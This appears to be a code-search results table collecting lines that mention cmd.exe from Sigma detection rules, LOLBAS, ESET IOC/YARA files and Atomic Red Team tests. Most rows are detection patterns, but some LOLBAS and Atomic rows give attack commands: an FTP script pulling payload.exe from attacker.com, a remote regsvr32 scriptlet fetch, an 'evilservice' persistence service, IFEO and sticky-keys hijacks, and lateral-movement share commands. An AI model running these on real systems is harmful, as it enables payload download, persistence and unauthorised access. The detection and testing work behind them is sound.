[sigma](https://github.com/Neo23x0/sigma) | [win_redmimicry_winnti_proc.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_redmimicry_winnti_proc.yml) | `- cmd.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- 'cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_shell_spawn_mshta.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_mshta.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_shell_spawn_susp_program.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml) | `# - '*\cmd.exe'  # too many false positives`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_sticky_keys_unauthenticated_privileged_console_access.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_sticky_keys_unauthenticated_privileged_console_access.yml) | `- "copy /y C:\\windows\\system32\\cmd.exe C:\\windows\\system32\\sethc.exe"`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_cmd_http_appdata.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_cmd_http_appdata.yml) | `Image\|endswith: '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_copy_lateral_movement.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_copy_lateral_movement.yml) | `Image\|endswith: '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_crackmapexec_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_execution.yml) | `- 'cmd.exe /Q /c * 1> \\\\*\\*\\* 2>&1'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_crackmapexec_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_execution.yml) | `- 'cmd.exe /C * > \\\\*\\*\\* 2>&1'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_crackmapexec_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_execution.yml) | `- 'cmd.exe /C * > *\\Temp\\* 2>&1'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_explorer.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_explorer.yml) | `- \cmd.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_explorer.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_explorer.yml) | `- Legitimate explorer.exe run from cmd.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_explorer_break_proctree.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_explorer_break_proctree.yml) | `description: Detects a command line process that uses explorer.exe /root, which is similar to cmd.exe /c, only it breaks the process tree and makes its parent a new instance of explorer`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_mshta_pattern.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_mshta_pattern.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_pester.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_pester.yml) | `Image\|endswith: '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_psexex_paexec_flags.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_psexex_paexec_flags.yml) | `- 'cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_rclone_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_rclone_execution.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_regsvr32_anomalies.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_regsvr32_anomalies.yml) | `ParentImage\|endswith: '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_servu_process_pattern.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_servu_process_pattern.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_shell_spawn_from_mssql.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_shell_spawn_from_mssql.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_spoolsv_child_processes.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_spoolsv_child_processes.yml) | `Image\|endswith: \cmd.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_whoami_anomaly.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_whoami_anomaly.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_uac_bypass_wmp.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_uac_bypass_wmp.yml) | `Image: 'C:\Windows\System32\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_using_settingsynchost_as_lolbin.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_using_settingsynchost_as_lolbin.yml) | `- 'cmd.exe /c'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_webshell_recon_detection.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_webshell_recon_detection.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_webshell_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_webshell_spawn.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_always_install_elevated_msi_spawned_cmd_and_powershell_spawned_processes.yml](https://github.com/Neo23x0/sigma/blob/master/rules-unsupported/sysmon_always_install_elevated_msi_spawned_cmd_and_powershell_spawned_processes.yml) | `- '\cmd.exe'`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [collection_repeat.yml](https://github.com/Neo23x0/sigma/blob/master/tests/collection_repeat.yml) | `CommandLine: cmd.exe`{:.highlight .language-yaml} | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bitsadmin.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml) | `- Command: bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bitsadmin.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml) | `Description: Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bitsadmin.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml) | `Description: Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bitsadmin.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml) | `- Command: bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bitsadmin.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml) | `Description: Command for copying cmd.exe to another folder`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bitsadmin.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml) | `- Command: bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Bitsadmin.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Bitsadmin.yml) | `Description: One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml) | `Name: Cmd.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml) | `- Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml) | `- Command: cmd.exe - < fakefile.doc:payload.bat`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml) | `- Path: C:\Windows\System32\cmd.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml) | `- Path: C:\Windows\SysWOW64\cmd.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Cmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml) | `- IOC: cmd.exe executing files from alternate data streams.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Ftp.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml) | `- Command: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Sc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Sc.yml) | `- Command: sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `- Command: wmic.exe process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Wmic.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml) | `Description: Add cmd.exe as a debugger for the osk.exe process. Each time osk.exe is run, cmd.exe will be run as well.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Advpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml) | `- Command: rundll32 advpack.dll, RegisterOCX "cmd.exe /c calc.exe"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Ieadvpack.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml) | `- Command: rundll32 ieadvpack.dll, RegisterOCX "cmd.exe /c calc.exe"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Shell32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Shell32.yml) | `- Command: rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd.exe" "/c echo hi"`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Winrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Winrm.yml) | `- Command: 'winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd.exe /k c:\windows\system32\notepad.exe"} -r:http://acmedc:5985   \nwinrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985'`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mftrace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml) | `- Command: Mftrace.exe cmd.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mftrace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml) | `Description: Launch cmd.exe as a subprocess of Mftrace.exe.`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mftrace.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mftrace.yml) | `Usecase: Local execution of cmd.exe as a subprocess of Mftrace.exe.`{:.highlight .language-yaml} | 
[malware-ioc](https://github.com/eset/malware-ioc) | [badiis.yar](https://github.com/eset/malware-ioc/blob/master/badiis/badiis.yar) | `$s1 = "cmd.exe" ascii wide`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [badiis.yar](https://github.com/eset/malware-ioc/blob/master/badiis/badiis.yar) | `$s4 = "cmd.exe"`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [badiis.yar](https://github.com/eset/malware-ioc/blob/master/badiis/badiis.yar) | `$s5 = "cmd.exe"`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [badiis.yar](https://github.com/eset/malware-ioc/blob/master/badiis/badiis.yar) | `$s4 = "\\cmd.exe" nocase`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [win_apt_invisimole_wdigest_chain.yml](https://github.com/eset/malware-ioc/blob/master/invisimole/sigma/win_apt_invisimole_wdigest_chain.yml) | `CommandLine\|contains: 'rundll32.exe Shell32.dll ShellExec_RunDLL cmd.exe /c mkdir SMRTNTKY\MessageB.txt'`{:.highlight .language-yaml} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [nukesped_lazarus](https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc) | `==== cmd.exe /c "%s 2>> %s"`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [nukesped_lazarus](https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc) | `==== cmd.exe /c "%s >> %s 2>&1"`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [nukesped_lazarus](https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc) | `==== cmd.exe /c "%s" > %s 2>&1`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [nukesped_lazarus](https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc) | `==== cmd.exe /c "" > 2>&1 (on stack)`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[malware-ioc](https://github.com/eset/malware-ioc) | [nukesped_lazarus](https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc) | `==== cmd.exe /c %s >> %s 2>&1`{:.highlight .language-cmhg} | [© ESET 2014-2018](https://github.com/eset/malware-ioc/blob/master/LICENSE)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: File and Directory Discovery (cmd.exe) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: File and Directory Discovery (cmd.exe) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1007.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1007/T1007.md) | Upon successful execution, cmd.exe will execute service commands with expected result to stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1007.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1007/T1007.md) | Upon successful execution, net.exe will run from cmd.exe that queries services. Expected output is to a txt file in c:\Windows\Temp\service-list.txt.s | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1010.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1010/T1010.md) | Upon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1012.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1012/T1012.md) | Upon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS). | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1016.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md) | Upon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1016.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md) | Upon successful execution, cmd.exe will spawn netsh.exe to list firewall rules. Output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1016.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md) | Upon successful execution, cmd.exe will spawn `ipconfig /all`, `net config workstation`, `net view /all /domain`, `nltest /domain_trusts`. Output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1018.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md) | Upon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1018.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md) | Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the "Domain Computers" group. Output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1018.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md) | Upon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1018.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md) | Upon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1018.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md) | Upon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1018.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md) | Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1018.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md) | foreach ($ip in 1..255 \| % { "$firstOctet.$secondOctet.$thirdOctet.$_" } ) {cmd.exe /c nslookup $ip} | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1021.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md) | cmd.exe /c "net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1021.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md) | \| command_path \| File to copy and execute \| Path \| C:&#92;Windows&#92;System32&#92;cmd.exe\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1021.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.002/T1021.002.md) | cmd.exe /Q /c #{command_to_execute} 1> \\127.0.0.1\ADMIN$\#{output_file} 2>&1 | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1027.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.004/T1027.004.md) | \| input_file \| C# code that launches calc.exe from a hidden cmd.exe Window \| Path \| PathToAtomicsFolder&#92;T1027.004&#92;src&#92;calc.cs\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1033.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md) | Upon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout.  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1033.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.md) | cmd.exe /C whoami | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036/T1036.md) | copy %WINDIR%\System32\cmd.exe /Y %ALLUSERSPROFILE%\cmd.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1036.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036/T1036.md) | start %ALLUSERSPROFILE%\cmd.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
